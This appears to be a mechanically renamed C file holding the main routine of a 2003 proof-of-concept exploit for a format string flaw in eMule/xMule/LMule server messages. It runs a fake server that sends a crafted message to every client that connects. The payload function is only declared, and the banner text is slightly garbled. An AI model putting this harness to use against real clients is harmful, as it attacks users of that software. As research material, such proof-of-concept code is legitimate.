#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int FUNC0 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (char const*) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,char const*,char const*) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 scalar_t__ FUNC7 (int) ; 
 int FUNC8 (char const*,char const*) ; 
 int /*<<< orphan*/  stdout ; 
 int FUNC9 (char*) ; 

int
FUNC10 (int argc, char *argv[])
{
	FUNC6 ("eMule/xMule/LMule OP_SERVERMESSAGE "
			"Format String Vulnerabilitytion Vulnerability\n"
		"proof of concept code\n"
		"Copyright (C) 2003 RÃ©mi Denis-Courmont "
			"<exploit@simutrans.fr.st>\n");
	if (argc > 3)
		return FUNC9 (argv[0]);
	else
	{
		int listenfd;
		const char *host, *port;

		port = (argc < 2) ? "4661" : argv[2];
		host = (argc < 3) ? NULL : argv[3];
		FUNC5 ("Binding to [%s]:%s ...\n",
			(host != NULL) ? host : "any", port);
		listenfd = FUNC8 (host, port);
		if (listenfd == -1)
		{
			FUNC3 (host);
			return 1;
		}

		while (1)
		{
			int clientfd;

			FUNC2 ("Waiting for a client to connect ... ", stdout);
			clientfd = FUNC0 (listenfd, NULL, 0);
			if (clientfd == -1)
			{
				FUNC6 ("");
				FUNC4 ("Error");
				continue;
			}
			FUNC6 ("OK");
			FUNC2 ("Sending server message ... ", stdout);
			if (FUNC7 (clientfd))
			{
				FUNC6 ("");
				FUNC4 ("Error");
			}
			else
				FUNC6 ("Done");
			FUNC1 (clientfd);
		}
	}

	return 0; /* dead code */
}